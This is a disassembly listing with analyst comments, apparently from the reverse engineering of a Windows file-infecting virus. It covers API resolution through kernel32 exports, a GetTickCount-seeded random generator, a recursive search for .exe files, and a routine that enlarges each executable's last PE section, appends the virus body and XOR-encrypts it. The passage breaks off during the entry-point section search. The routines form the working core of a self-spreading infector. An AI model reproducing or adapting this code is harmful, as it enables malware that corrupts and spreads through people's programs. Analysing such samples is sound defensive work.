.data:00403113                 lea     esi, [ebp+4018C1h] ; GetFileAttributes
.data:00403119                 call    Get_Func_Addr
.data:0040311E                 mov     [ebp+4018D3h], eax ; save GetFileAttributes base addr
.data:00403124                 mov     eax, [ebp+401BB9h] ; Kernel32.dll
.data:0040312A                 lea     esi, [ebp+4018D7h] ; FindNextFile
.data:00403130                 call    Get_Func_Addr
.data:00403135                 mov     [ebp+4018E4h], eax ; save FindNextFile base addr
.data:0040313B                 mov     eax, [ebp+401BB9h] ; Kernel32.dll
.data:00403141                 lea     esi, [ebp+4018E8h] ; FindClose
.data:00403147                 call    Get_Func_Addr
.data:0040314C                 mov     [ebp+4018F2h], eax ; save FindClose base addr
.data:00403152                 mov     eax, [ebp+401BB9h] ; Kernel32.dll
.data:00403158                 lea     esi, [ebp+401793h] ; GlobalAlloc
.data:0040315E                 call    Get_Func_Addr
.data:00403163                 mov     [ebp+40179Fh], eax ; save GlobalAlloc base addr
.data:00403169                 mov     eax, [ebp+401BB9h] ; Kernel32.dll
.data:0040316F                 lea     esi, [ebp+4017A3h] ; GlobalFree
.data:00403175                 call    Get_Func_Addr
.data:0040317A                 mov     [ebp+4017AEh], eax ; save GlobalFree base addr
.data:00403180                 mov     eax, [ebp+401BB9h] ; Kernel32.dll
.data:00403186                 lea     esi, [ebp+4017B2h] ; CreateFile
.data:0040318C                 call    Get_Func_Addr
.data:00403191                 mov     [ebp+4017BDh], eax ; save CreateFile base addr
.data:00403197                 mov     eax, [ebp+401BB9h] ; Kernel32.dll
.data:0040319D                 lea     esi, [ebp+40188Eh] ; GetTickCount
.data:004031A3                 call    Get_Func_Addr
.data:004031A8                 mov     [ebp+40189Bh], eax ; save GetTickCount base addr
.data:004031AE                 mov     eax, [ebp+401BB9h] ; Kernel32.dll
.data:004031B4                 lea     esi, [ebp+40183Bh] ; CreateMutex
.data:004031BA                 call    Get_Func_Addr
.data:004031BF                 mov     [ebp+401847h], eax ; save CreateMutex base addr
.data:004031C5                 mov     eax, [ebp+401BB9h] ; Kernel32.dll
.data:004031CB                 lea     esi, [ebp+40184Bh] ; OpenMutex
.data:004031D1                 call    Get_Func_Addr
.data:004031D6                 mov     [ebp+401855h], eax ; save OpenMutex base addr
.data:004031DC                 mov     eax, [ebp+401BB9h] ; Kernel32.dll
.data:004031E2                 lea     esi, [ebp+401859h] ; ReleaseMutex
.data:004031E8                 call    Get_Func_Addr
.data:004031ED                 mov     [ebp+401866h], eax ; save ReleaseMutex base addr
.data:004031F3                 mov     eax, [ebp+401BB9h] ; Kernel32.dll
.data:004031F9                 lea     esi, [ebp+40189Fh] ; GetFileSize
.data:004031FF                 call    Get_Func_Addr
.data:00403204                 mov     [ebp+4018ABh], eax ; save GetFileSize base addr
.data:0040320A                 mov     eax, [ebp+401BB9h] ; Kernel32.dll
.data:00403210                 lea     esi, [ebp+4017C1h] ; CreateFileMapping
.data:00403216                 call    Get_Func_Addr
.data:0040321B                 mov     [ebp+4017D3h], eax ; save CreateFileMapping base addr
.data:00403221                 mov     eax, [ebp+401BB9h] ; Kernel32.dll
.data:00403227                 lea     esi, [ebp+4017D7h] ; MapViewOfFile
.data:0040322D                 call    Get_Func_Addr
.data:00403232                 mov     [ebp+4017E5h], eax ; save MapViewOfFile base addr
.data:00403238                 mov     eax, [ebp+401BB9h] ; Kernel32.dll
.data:0040323E                 lea     esi, [ebp+40186Ah] ; UnmapViewOfFile
.data:00403244                 call    Get_Func_Addr
.data:00403249                 mov     [ebp+40187Ah], eax ; save UnmapViewOfFile base addr
.data:0040324F                 mov     eax, [ebp+401BB9h] ; Kernel32.dll
.data:00403255                 lea     esi, [ebp+40187Eh] ; CloseHandle
.data:0040325B                 call    Get_Func_Addr
.data:00403260                 mov     [ebp+40188Ah], eax ; save CloseHandle base addr
.data:00403266                 jmp     found_all
.data:0040326B
.data:0040326B ; =============== S U B R O U T I N E =======================================
.data:0040326B
.data:0040326B
.data:0040326B Get_Func_Addr   proc near               ; CODE XREF: .data:004030A6\u2191p
.data:0040326B                                         ; .data:004030BD\u2191p ...
.data:0040326B                 mov     ebx, [eax+3Ch]  ; File alignment
.data:0040326E                 add     ebx, eax        ; Base of Kernel32.dll "PE"
.data:00403270                 add     ebx, 78h ; 'x'  ; Offset - Export Directory VA
.data:00403273                 mov     ebx, [ebx]      ; ebx = Export Directory VA
.data:00403275                 add     ebx, eax        ; edx = 750118D4
.data:00403277                 xor     edx, edx        ; edx = 0
.data:00403279                 mov     ecx, [ebx+20h]  ; Address of Names VA
.data:0040327C                 add     ecx, eax        ; ecx = 750122E0
.data:0040327E                 push    esi             ; Offset of function name
.data:0040327F                 push    edx             ; edx = 0
.data:00403280
.data:00403280 compare_next:                           ; CODE XREF: Get_Func_Addr+27\u2193j
.data:00403280                 pop     edx             ; Restore edx
.data:00403281                 pop     esi             ; restore addr of function name being searched
.data:00403282                 inc     edx             ; next function name
.data:00403283                 mov     edi, [ecx]      ; edi = VA (function name pointer)
.data:00403285                 add     edi, eax        ; addr of array of function names
.data:00403287                 add     ecx, 4          ; ecx + 4
.data:0040328A                 push    esi             ; save func name offset
.data:0040328B                 push    edx             ; save edx = 1
.data:0040328C
.data:0040328C compare_name:                           ; CODE XREF: Get_Func_Addr+30\u2193j
.data:0040328C                 mov     dl, [edi]       ; 8 bits of the entry in the Array of func names
.data:0040328E                 mov     dh, [esi]       ; 8 bits of function to be loaded
.data:00403290                 cmp     dl, dh          ; Compare first characters
.data:00403292                 jnz     short compare_next ; Not the same to get the next function
.data:00403294                 inc     edi             ; get the next char
.data:00403295                 inc     esi             ; get the next char
.data:00403296                 cmp     byte ptr [esi], 0 ; compare name
.data:00403299                 jz      short get_address ; function names match so get the address
.data:0040329B                 jmp     short compare_name ; compare the next characters
.data:0040329D ; ---------------------------------------------------------------------------
.data:0040329D
.data:0040329D get_address:                            ; CODE XREF: Get_Func_Addr+2E\u2191j
.data:0040329D                 pop     edx             ; restore edx
.data:0040329E                 pop     esi             ; restore esi
.data:0040329F                 dec     edx             ; edx -1
.data:004032A0                 shl     edx, 1          ; 16 bit array
.data:004032A2                 mov     ecx, [ebx+24h]  ; addr of ordinals VA
.data:004032A5                 add     ecx, eax        ; ecx + eax
.data:004032A7                 add     ecx, edx        ; ecx + edx
.data:004032A9                 xor     edx, edx        ; edx = 0
.data:004032AB                 mov     dx, [ecx]       ; dx = addr of ecx
.data:004032AE                 shl     edx, 2          ; 32 bit array
.data:004032B1                 mov     ecx, [ebx+1Ch]  ; Addr of func - VA
.data:004032B4                 add     ecx, eax        ; Base + RVA
.data:004032B6                 add     ecx, edx        ; Add edx to get the offset
.data:004032B8                 add     eax, [ecx]      ; save te value in eax
.data:004032BA                 retn                    ; return
.data:004032BA Get_Func_Addr   endp
.data:004032BA
.data:004032BB
.data:004032BB ; =============== S U B R O U T I N E =======================================
.data:004032BB
.data:004032BB
.data:004032BB random_seed     proc near               ; CODE XREF: open_file:loop_to_update_key\u2193p
.data:004032BB                 mov     eax, ss:dword_401BE5[ebp] ; eax = seed = GetTickCount
.data:004032C1                 xor     edx, edx        ; edx = 0
.data:004032C3                 mov     ecx, 1F31Dh     ; ecx = 1F31Dh
.data:004032C8                 div     ecx             ; randomize eax using the GetTickCount value and 1F31Dh
.data:004032CA                 mov     ecx, eax        ; ecx = random number generated
.data:004032CC                 mov     eax, 41A7h      ; eax = 41A7h
.data:004032D1                 mul     edx             ; eax * (remainder of the previous division)
.data:004032D3                 mov     edx, ecx        ; edx = ecx
.data:004032D5                 mov     ecx, eax        ; ecx = result of division by the remainder of the random value
.data:004032D7                 mov     eax, 0B14h      ; eax = 0B14h
.data:004032DC                 mul     edx             ; eax * edx
.data:004032DE                 sub     ecx, eax        ; ecx - (eax*edx)
.data:004032E0                 xor     edx, edx        ; edx = 0
.data:004032E2                 mov     eax, ecx        ; eax = ecx
.data:004032E4                 mov     [ebp+401BE5h], ecx ; save the new seed generated, value is ar ecx
.data:004032EA                 retn                    ; return
.data:004032EA random_seed     endp
.data:004032EA
.data:004032EB ; ---------------------------------------------------------------------------
.data:004032EB
.data:004032EB found_all:                              ; CODE XREF: .data:00403266\u2191j
.data:004032EB                 mov     eax, [ebp+40189Bh] ; addr of GetTickCount
.data:004032F1                 call    eax             ; Call GetTickCount
.data:004032F3                 mov     [ebp+401BE5h], eax ; num of milliseonds becomes key
.data:004032F9                 lea     esi, [ebp+401BF4h] ; "danger"
.data:004032FF                 push    esi             ; path name = danger. chdir fails and current working dir is set
.data:00403300                 mov     eax, [ebp+4017FDh] ; addr of SetCurrentDirectory
.data:00403306                 call    eax             ; set current dir to danger
.data:00403308                 call    recursive_check
.data:0040330D                 jmp     overwrite_and_display
.data:00403312 ; ---------------------------------------------------------------------------
.data:00403312                 mov     eax, ss:dword_401813[ebp] ; GetCurrentProcess [Never Called]
.data:00403318                 call    eax             ; GetCurrentProcess()
.data:0040331A                 mov     ebx, [esp+4]    ; ebx = return value
.data:0040331E                 push    ebx             ; save ebx onto stack
.data:0040331F                 push    eax             ; save eax onto stack
.data:00403320                 mov     eax, ss:dword_401828[ebp] ; SetPriorityClass
.data:00403326                 call    eax             ; SetPriorityClass()
.data:00403328                 retn                    ; return
.data:00403329
.data:00403329 ; =============== S U B R O U T I N E =======================================
.data:00403329
.data:00403329
.data:00403329 check_file_extension proc near          ; CODE XREF: recursive_check+BF\u2193p
.data:00403329                 mov     esi, ecx        ; esi = ecx
.data:0040332B
.data:0040332B check_if_null_char:                     ; CODE XREF: check_file_extension:loc_40333F\u2193j
.data:0040332B                 lodsb                   ; load char of file name
.data:0040332C                 or      al, al          ; is it null char?
.data:0040332E                 jnz     short loc_403339 ; no so jump here
.data:00403330                 mov     eax, 0FFFFFFFFh ; set eax = -1
.data:00403335                 jmp     short return    ; return
.data:00403335 ; ---------------------------------------------------------------------------
.data:00403337                 db 0EBh ; \EB
.data:00403338                 db    6
.data:00403339 ; ---------------------------------------------------------------------------
.data:00403339
.data:00403339 loc_403339:                             ; CODE XREF: check_file_extension+5\u2191j
.data:00403339                 cmp     al, 2Eh ; '.'   ; is the char '.'?
.data:0040333B                 jnz     short loc_40333F ; no so jump here
.data:0040333D                 jmp     short loc_403341 ; yes so jump here
.data:0040333F ; ---------------------------------------------------------------------------
.data:0040333F
.data:0040333F loc_40333F:                             ; CODE XREF: check_file_extension+12\u2191j
.data:0040333F                 jmp     short check_if_null_char ; check character of filename
.data:00403341 ; ---------------------------------------------------------------------------
.data:00403341
.data:00403341 loc_403341:                             ; CODE XREF: check_file_extension+14\u2191j
.data:00403341                 xor     eax, eax        ; eax = 0
.data:00403343                 mov     al, 2Eh ; '.'   ; al = '.'
.data:00403345                 rol     eax, 8          ; rotate eax left (endiannes conversion)
.data:00403348                 lodsb                   ; load first char of file extension
.data:00403349                 rol     eax, 8          ; rotate eax left (endiannes conversion)
.data:0040334C                 lodsb                   ; load second char of file extension
.data:0040334D                 rol     eax, 8          ; rotate eax left (endiannes conversion)
.data:00403350                 lodsb                   ; load third char of file extension
.data:00403351                 cmp     eax, 2E657865h  ; is it a file with .exe extension
.data:00403356                 jnz     short not_exe   ; not an .exe file so jump here
.data:00403358                 mov     eax, 1          ; set eax to 1
.data:0040335D                 jmp     short return
.data:0040335F ; ---------------------------------------------------------------------------
.data:0040335F
.data:0040335F not_exe:                                ; CODE XREF: check_file_extension+2D\u2191j
.data:0040335F                 mov     eax, 0          ; not .exe file so set eax to 0
.data:00403364
.data:00403364 return:                                 ; CODE XREF: check_file_extension+C\u2191j
.data:00403364                                         ; check_file_extension+34\u2191j
.data:00403364                 retn                    ; return
.data:00403364 check_file_extension endp
.data:00403364
.data:00403365
.data:00403365 ; =============== S U B R O U T I N E =======================================
.data:00403365
.data:00403365
.data:00403365 recursive_check proc near               ; CODE XREF: .data:00403308\u2191p
.data:00403365                                         ; recursive_check+97\u2193p
.data:00403365                 push    ebx             ; save old frame pointer
.data:00403366                 mov     ebx, esp        ; make current stack pointer the new frame pointer
.data:00403368                 add     esp, 0FFFFFFF8h ; space allocation
.data:0040336B                 push    ebx             ; save current stack pointer
.data:0040336C                 push    13Eh            ; 318 bytes to allocate
.data:00403371                 push    40h ; '@'       ; Initializes memory contents to zero
.data:00403373                 mov     eax, ss:dword_40179F[ebp] ; addr of "GlobalAlloc"
.data:00403379                 call    eax             ; Global -> Allocate 318 bytes on heap init memory to 0
.data:0040337B                 pop     ebx             ; restore fp
.data:0040337C                 mov     [ebx-8], eax    ; [ebx - 8] = handle to the newly allocated memory object.
.data:0040337F                 push    ebx             ; save ebx onto stack
.data:00403380                 push    dword ptr [ebx-8] ; save memory handle
.data:00403383                 lea     eax, byte_401BED[ebp] ; pointer to '.'
.data:00403389                 push    eax             ; save '.' to stack
.data:0040338A                 mov     eax, ss:dword_4018BD[ebp] ; eax = addr of FindFirstFile
.data:00403390                 call    eax             ; FindFirstFile('.', Memory handle from 0040337C)
.data:00403392                 pop     ebx             ; restore fp
.data:00403393                 or      eax, eax        ; valid handle?
.data:00403395                 jnz     short loc_4033A1 ; Yes so jump here
.data:00403397                 mov     eax, 0FFFFFFFFh ; failed so return -1
.data:0040339C                 jmp     loc_40343A      ; failed so jump here
.data:004033A1 ; ---------------------------------------------------------------------------
.data:004033A1
.data:004033A1 loc_4033A1:                             ; CODE XREF: recursive_check+30\u2191j
.data:004033A1                 mov     [ebx-4], eax    ; save the memory handle of FindFirstFile
.data:004033A4                 mov     eax, [ebx-8]    ; FindFirstFile memory handle
.data:004033A7                 cmp     byte ptr [eax+2Ch], 2Eh ; '.' ; 2Eh = '.' which means curr directory
.data:004033AB                 jnz     short find_next_file
.data:004033AD                 jmp     short $+2       ; jump to current + 2 bytes
.data:004033AF ; ---------------------------------------------------------------------------
.data:004033AF
.data:004033AF find_next_file:                         ; CODE XREF: recursive_check+46\u2191j
.data:004033AF                                         ; recursive_check+48\u2191j ...
.data:004033AF                 push    ebx             ; save ebx to stack
.data:004033B0                 push    dword ptr [ebx-8] ; save the first file memory handle
.data:004033B3                 mov     eax, [ebx-4]    ; next file memory handle
.data:004033B6                 push    eax             ; save next file memory handle
.data:004033B7                 mov     eax, ss:dword_4018E4[ebp] ; addr of FindNextFile
.data:004033BD                 call    eax             ; call function FindNextFile
.data:004033BF                 pop     ebx             ; restore fp
.data:004033C0                 or      eax, eax        ; successfully found next file?
.data:004033C2                 jnz     short loc_4033CB ; Yes so jump here
.data:004033C4                 mov     eax, 0FFFFFFFFh ; failed so return -1
.data:004033C9                 jmp     short loc_40343A ; failed so restore esp
.data:004033CB ; ---------------------------------------------------------------------------
.data:004033CB
.data:004033CB loc_4033CB:                             ; CODE XREF: recursive_check+5D\u2191j
.data:004033CB                 mov     eax, [ebx-8]    ; pointer to memory with file info
.data:004033CE                 lea     ecx, [eax+2Ch]  ; file name
.data:004033D1                 push    ebx             ; save ebx
.data:004033D2                 push    ecx             ; @param FileName
.data:004033D3                 mov     eax, ss:dword_4018D3[ebp] ; eax = GetFileAttributes
.data:004033D9                 call    eax             ; GetFileAttributes(fileName)
.data:004033DB                 pop     ebx             ; restore ebx
.data:004033DC                 cmp     eax, 10h        ; is it a directory?
.data:004033DF                 jnz     short loc_403416 ; if not a directory jump here
.data:004033E1                 mov     eax, [ebx-8]    ; pointer to memory with file information
.data:004033E4                 cmp     byte ptr [eax+2Ch], 2Eh ; '.' ; byte ptr[eax+2Ch] == '.' ?
.data:004033E8                 jnz     short loc_4033EE ; no so jump here
.data:004033EA                 jmp     short find_next_file
.data:004033EA ; ---------------------------------------------------------------------------
.data:004033EC                 db 0EBh ; \EB
.data:004033ED                 db  24h ; $
.data:004033EE ; ---------------------------------------------------------------------------
.data:004033EE
.data:004033EE loc_4033EE:                             ; CODE XREF: recursive_check+83\u2191j
.data:004033EE                 push    ebx             ; save ebx
.data:004033EF                 lea     ecx, [eax+2Ch]  ; Name of the File
.data:004033F2                 push    ecx             ; @param lpPathName = name of file
.data:004033F3                 mov     eax, ss:dword_4017FD[ebp] ; eax = SetCurrentDirectory
.data:004033F9                 call    eax             ; BOOL SetCurrentDirectory(LPCTSTR lpPathName);
.data:004033FB                 pop     ebx             ; restore ebx
.data:004033FC                 call    recursive_check
.data:00403401                 push    ebx             ; save ebx
.data:00403402                 lea     ecx, byte_401BF1[ebp] ; ".." for parent directory
.data:00403408                 push    ecx             ; @param lpPathName = parent directory
.data:00403409                 mov     eax, ss:dword_4017FD[ebp] ; SetCurrentDirectory
.data:0040340F                 call    eax             ; set the current directory to the parent directory
.data:00403411                 pop     ebx             ; restore ebx
.data:00403412                 jmp     short find_next_file
.data:00403412 ; ---------------------------------------------------------------------------
.data:00403414                 db 0EBh ; \EB
.data:00403415                 db  1Fh
.data:00403416 ; ---------------------------------------------------------------------------
.data:00403416
.data:00403416 loc_403416:                             ; CODE XREF: recursive_check+7A\u2191j
.data:00403416                 push    ebx             ; save ebx onto stack
.data:00403417                 mov     eax, [ebx-8]    ; pointer to file info
.data:0040341A                 pop     ebx             ; restore ebx
.data:0040341B                 lea     ecx, [eax+2Ch]  ; ecx = filename
.data:0040341E                 mov     ss:dword_401C08[ebp], ecx ; save pointer to file name
.data:00403424                 call    check_file_extension
.data:00403429                 cmp     eax, 1          ; is it a .exe file?
.data:0040342C                 jnz     short loc_403435 ; no so find next file
.data:0040342E                 push    ebx             ; savc ebx
.data:0040342F                 call    open_file
.data:00403434                 pop     ebx             ; restore ebx
.data:00403435
.data:00403435 loc_403435:                             ; CODE XREF: recursive_check+C7\u2191j
.data:00403435                 jmp     find_next_file
.data:0040343A ; ---------------------------------------------------------------------------
.data:0040343A
.data:0040343A loc_40343A:                             ; CODE XREF: recursive_check+37\u2191j
.data:0040343A                                         ; recursive_check+64\u2191j
.data:0040343A                 mov     esp, ebx        ; restore original esp
.data:0040343C                 pop     ebx             ; restore ebx
.data:0040343D                 retn                    ; return
.data:0040343D recursive_check endp
.data:0040343D
.data:0040343E
.data:0040343E ; =============== S U B R O U T I N E =======================================
.data:0040343E
.data:0040343E
.data:0040343E open_file       proc near               ; CODE XREF: recursive_check+CA\u2191p
.data:0040343E                 push    0               ; Template = NULL
.data:00403440                 push    80h ; '\80'       ; FILE _ATTRIBUTE_NORMAL
.data:00403445                 push    4               ; CreationDistribution = OPEN_ALWAYS
.data:00403447                 push    0               ; SecurityDescriptor
.data:00403449                 push    3               ; ShareMode = FILE_SHARE_READ | FILE_SHARE_WRITE
.data:0040344B                 push    0C0000000h      ; Desired Access = GENERIC_READ | GENERIC_WRITE
.data:00403450                 mov     eax, ss:dword_401C08[ebp] ; eax = file name
.data:00403456                 push    eax             ; save file name as a param
.data:00403457                 mov     eax, ss:dword_4017BD[ebp] ; pointer to CreateFileA
.data:0040345D                 call    eax             ; CreateFileA()
.data:0040345F                 mov     ss:dword_401BA9[ebp], eax ; save handle of file
.data:00403465                 cmp     eax, 0FFFFFFFFh ; valid file handle?
.data:00403468                 jnz     short loc_403470 ; yes so jump here
.data:0040346A                 mov     ebx, 1          ; no so set ebx = 1
.data:0040346F                 retn                    ; return
.data:00403470 ; ---------------------------------------------------------------------------
.data:00403470
.data:00403470 loc_403470:                             ; CODE XREF: open_file+2A\u2191j
.data:00403470                 xor     ebx, ebx        ; ebx = 0
.data:00403472                 push    0               ; SizeHigh = NULL
.data:00403474                 push    eax             ; handle of the opened file
.data:00403475                 mov     eax, ss:dword_4018AB[ebp] ; GetFileSize
.data:0040347B                 call    eax             ; GetFileSize()
.data:0040347D                 add     eax, 0C31h      ; ass virus size
.data:00403482                 add     eax, 1000h      ; increase the size of the file
.data:00403487                 mov     ss:dword_401C0C[ebp], eax ; save modified file size
.data:0040348D                 push    0               ; name = NULL
.data:0040348F                 mov     eax, ss:dword_401C0C[ebp] ; eax has modified file size
.data:00403495                 push    eax             ; Size Low = modified file size
.data:00403496                 push    0               ; Size high = 0
.data:00403498                 push    4               ; Protect = PAGE_READWRITE
.data:0040349A                 push    0               ; SecurityDescriptor = NULL
.data:0040349C                 mov     eax, ss:dword_401BA9[ebp] ; handle to opened file
.data:004034A2                 push    eax             ; save handle to opened file as the param
.data:004034A3                 mov     eax, ss:dword_4017D3[ebp] ; eax = CreateFileMappingA
.data:004034A9                 call    eax             ; CreateFileMappingA()
.data:004034AB                 mov     ss:dword_401BAD[ebp], eax ; save handle of the file mapping object
.data:004034B1                 push    ss:dword_401C0C[ebp] ; file size
.data:004034B7                 push    0               ; offset low = 0
.data:004034B9                 push    0               ; offset high = 0
.data:004034BB                 push    2               ; ACCESS = FILE_MAP_WRITE
.data:004034BD                 mov     eax, ss:dword_401BAD[ebp] ; handle of the file mapping object
.data:004034C3                 push    eax             ; push handle as param
.data:004034C4                 mov     eax, ss:dword_4017E5[ebp] ; MapViewOfFile
.data:004034CA                 call    eax             ; MapViewOfFile()
.data:004034CC                 mov     ss:dword_401BB1[ebp], eax ; save the start addr of the mapped view
.data:004034D2                 mov     edi, eax        ; edi = start addr of the mapped view
.data:004034D4                 xor     eax, eax        ; eax = 0
.data:004034D6                 mov     ax, [edi]       ; ax = 1st word of mapped file
.data:004034D9                 add     edi, [edi+3Ch]  ; RVA to the PE header which is added to the image base
.data:004034DC                 add     edi, 4          ; Machine field in the header
.data:004034DF                 xor     ecx, ecx        ; ecx = 0
.data:004034E1                 mov     cx, [edi+2]     ; num of sections in the executable
.data:004034E5                 mov     ss:dword_401BC1[ebp], ecx ; save the pointer
.data:004034EB                 add     edi, 14h        ; magic field in the optional header
.data:004034EE                 mov     ss:dword_401BC5[ebp], edi ; save the pointer
.data:004034F4                 mov     eax, [edi+40h]  ; eax = checksum value
.data:004034F7                 cmp     eax, 0FFFFh     ; valid checksum?
.data:004034FC                 jnz     short loc_40352F ; valid so jump here
.data:004034FE                 mov     eax, ss:dword_401BB1[ebp] ; start addr of mapped view
.data:00403504                 push    eax             ; save addr onto stack
.data:00403505                 mov     eax, ss:dword_40187A[ebp] ; UnmapViewOfFile
.data:0040350B                 call    eax             ; UnmapViewofFile()
.data:0040350D                 mov     eax, ss:dword_401BAD[ebp] ; handle to file mapping object
.data:00403513                 push    eax             ; save handle to stack
.data:00403514                 mov     eax, ss:dword_40188A[ebp] ; close handle
.data:0040351A                 call    eax             ; CloseHandle()
.data:0040351C                 mov     eax, ss:dword_401BA9[ebp] ; handle of opened file
.data:00403522                 push    eax             ; save handle to stack
.data:00403523                 mov     eax, ss:dword_40188A[ebp] ; close handle
.data:00403529                 call    eax             ; CloseHandle()
.data:0040352B                 add     esp, 4          ; Remove variables from the stack
.data:0040352E                 retn
.data:0040352F ; ---------------------------------------------------------------------------
.data:0040352F
.data:0040352F loc_40352F:                             ; CODE XREF: open_file+BE\u2191j
.data:0040352F                 mov     eax, [edi+1Ch]  ; image base
.data:00403532                 mov     ss:dword_401BD1[ebp], eax ; save image base
.data:00403538                 mov     eax, [edi+10h]  ; addr of entry point
.data:0040353B                 mov     ss:dword_401BC9[ebp], eax ; save addr
.data:00403541                 add     edi, 0E0h ; '\E0' ; Section header addr
.data:00403547                 mov     ss:dword_401C10[ebp], edi ; save section header addr
.data:0040354D                 mov     edi, ss:dword_401C10[ebp] ; edi = addr of section header
.data:00403553                 mov     ecx, ss:dword_401BC1[ebp] ; ecx = number of sections
.data:00403559                 mov     edx, 0          ; edx = 0
.data:0040355E                 mov     ebx, 0          ; ebx = 0
.data:00403563
.data:00403563 loc_403563:                             ; CODE XREF: open_file+136\u2193j
.data:00403563                 or      ecx, ecx        ; is number of sections 0?
.data:00403565                 jnz     short loc_403569 ; No so jump here
.data:00403567                 jmp     short loc_403576 ; Yes so jump here
.data:00403569 ; ---------------------------------------------------------------------------
.data:00403569
.data:00403569 loc_403569:                             ; CODE XREF: open_file+127\u2191j
.data:00403569                 cmp     edx, [edi+14h]  ; NULL pointer to raw data?
.data:0040356C                 jnb     short loc_403570 ; yes so jump here
.data:0040356E                 mov     ebx, edi        ; no so ebx = pointer
.data:00403570
.data:00403570 loc_403570:                             ; CODE XREF: open_file+12E\u2191j
.data:00403570                 add     edi, 28h ; '('  ; move to the next section
.data:00403573                 dec     ecx             ; decrement counter for section number
.data:00403574                 jmp     short loc_403563 ; Loop through until counter for number of sections is 0
.data:00403576 ; ---------------------------------------------------------------------------
.data:00403576
.data:00403576 loc_403576:                             ; CODE XREF: open_file+129\u2191j
.data:00403576                 mov     edi, ebx        ; section header of last section
.data:00403578                 mov     eax, ss:dword_401BC5[ebp] ; pointer to section header
.data:0040357E                 mov     ebx, [eax+24h]  ; file alignment
.data:00403581                 mov     ss:dword_401BD9[ebp], ebx ; save the file alignment
.data:00403587                 mov     ebx, [eax+20h]  ; section alignment
.data:0040358A                 mov     ss:dword_401BDD[ebp], ebx ; save the section alignment
.data:00403590                 mov     eax, ss:dword_401BB1[ebp] ; eax = start addr of mapped view
.data:00403596                 add     eax, [edi+14h]  ; add the pointer to start addr of mapped view
.data:00403599                 add     eax, [edi+8]    ; add size of the data
.data:0040359C                 mov     ss:dword_40175F[ebp], eax ; save the pointer
.data:004035A2                 mov     eax, [edi+0Ch]  ; eax = RVA
.data:004035A5                 add     eax, [edi+8]    ; add size of the data
.data:004035A8                 mov     ss:dword_401763[ebp], eax ; VA of the end of the PE
.data:004035AE                 mov     eax, [edi+8]    ; size of section data
.data:004035B1                 add     eax, 0C31h      ; increase size
.data:004035B6                 add     eax, 65h ; 'e'  ; increase size
.data:004035BB                 mov     [edi+8], eax    ; Update the size after the increment
.data:004035BE                 push    edi             ; save pointer to the last section
.data:004035BF                 mov     edi, ss:dword_401BC5[ebp] ; pointer to beginning of the optional header
.data:004035C5                 mov     eax, [edi+38h]  ; size of Image
.data:004035C8                 add     eax, 0C31h      ; increase size
.data:004035CD                 add     eax, 65h ; 'e'  ; increase size
.data:004035D2                 pop     edi             ; restore pointer to the last section
.data:004035D3                 mov     eax, [edi+10h]  ; size of raw data
.data:004035D6                 add     eax, 0C31h      ; increase size
.data:004035DB                 add     eax, 65h ; 'e'  ; increase size
.data:004035E0                 push    eax             ; save updated size
.data:004035E1                 xor     edx, edx        ; edx = 0
.data:004035E3                 mov     ebx, ss:dword_401BD9[ebp] ; FileAlignment
.data:004035E9                 div     ebx             ; divide updated size by the alignment size
.data:004035EB                 pop     edx             ; restore ebx
.data:004035EC                 add     eax, edx        ; increase alignment size
.data:004035EE                 mov     [edi+10h], eax  ; update SizeOfRawData
.data:004035F1                 mov     edi, ss:dword_40175F[ebp] ; pointer to end of last section
.data:004035F7                 mov     esi, offset start ; pointer to beginning of virus
.data:004035FC                 add     esi, ebp        ; add the ebp to point to the jump instruction before the decryption loop.
.data:004035FE                 mov     ecx, 0C31h      ; ecx = 0C31h
.data:00403603                 mov     ecx, 61h ; 'a'  ; ecx = 61h
.data:00403608                 rep movsb               ; copy 61h bytes from the start of the virus to the end of the exe
.data:0040360A                 mov     eax, ss:dword_401BE5[ebp] ; result of GetTickCount()
.data:00403610                 stosd                   ; save the result
.data:00403611                 add     esi, 4          ; esi += 4
.data:00403614                 mov     ecx, 0C31h      ; ecx = 0C31h
.data:00403619
.data:00403619 encrypt_loop:                           ; CODE XREF: open_file+214\u2193j
.data:00403619                 lodsb                   ; Load byte into AL
.data:0040361A                 push    eax             ; save eax onto stack
.data:0040361B                 push    ecx             ; save ecx onto stack
.data:0040361C                 mov     eax, ss:dword_401BE5[ebp] ; eax = result from GetTickCount [no. of millis]
.data:00403622                 xor     edx, edx        ; edx = 0
.data:00403624                 mov     ecx, 1F31Dh     ; ecx = 1F31Dh
.data:00403629                 div     ecx             ; randomize eax using the GetTickCount value and 1F31Dh
.data:0040362B                 mov     ecx, eax        ; ecx = random number generated
.data:0040362D                 mov     eax, 41A7h      ; eax = 41A7h
.data:00403632                 mul     edx             ; eax * (remainder of the previous division)
.data:00403634                 mov     edx, ecx        ; edx = ecx
.data:00403636                 mov     ecx, eax        ; ecx = result of division by the remainder of the random value
.data:00403638                 mov     eax, 0B14h      ; eax = 0B14h
.data:0040363D                 mul     edx             ; eax * edx
.data:0040363F                 sub     ecx, eax        ; ecx - (eax*edx)
.data:00403641                 xor     edx, edx        ; edx = 0
.data:00403643                 mov     eax, ecx        ; eax = ecx
.data:00403645                 mov     ss:dword_401BE5[ebp], ecx ; save the new seed generated, value is a ecx
.data:0040364B                 mov     edx, eax        ; edx = eax
.data:0040364D                 pop     ecx             ; restore ecx
.data:0040364E                 pop     eax             ; restore eax
.data:0040364F                 xor     al, dl          ; encrypt data
.data:00403651                 stosb                   ; store encrypted data
.data:00403652                 loop    encrypt_loop    ; encrypt until ecx = 0
.data:00403654                 mov     ss:dword_40176B[ebp], edi ; save addr after encrypting
.data:0040365A                 mov     edi, ss:dword_401C10[ebp] ; pointer to first section header
.data:00403660                 mov     ecx, ss:dword_401BC1[ebp] ; pointer to number of sections
.data:00403666
.data:00403666 loc_403666:                             ; CODE XREF: open_file+252\u2193j
.data:00403666                 or      ecx, ecx        ; number of sections 0?
.data:00403668                 jnz     short loc_40366F ; no so jump here
.data:0040366A                 or      edi, 0FFFFFFFFh ; edi | -1
.data:0040366D                 jmp     short loc_403692 ; jump here if yes
.data:0040366F ; ---------------------------------------------------------------------------
.data:0040366F
.data:0040366F loc_40366F:                             ; CODE XREF: open_file+22A\u2191j
.data:0040366F                 mov     eax, ss:dword_401BC9[ebp] ; addr of entry point
.data:00403675                 cmp     eax, [edi+0Ch]  ; compare virtual addr with entry point addr
.data:00403678                 jb      short loc_40368C ; if va < entry point addr go to the next section
.data:0040367A                 mov     ebx, [edi+0Ch]  ; rva of where the section is loaded
.data:0040367D                 add     ebx, [edi+8]    ; add size of the data
.data:00403680                 cmp     eax, ebx        ; rva + size > entry point addr?
.data:00403682                 jnb     short loc_40368C ; go to next section if not below
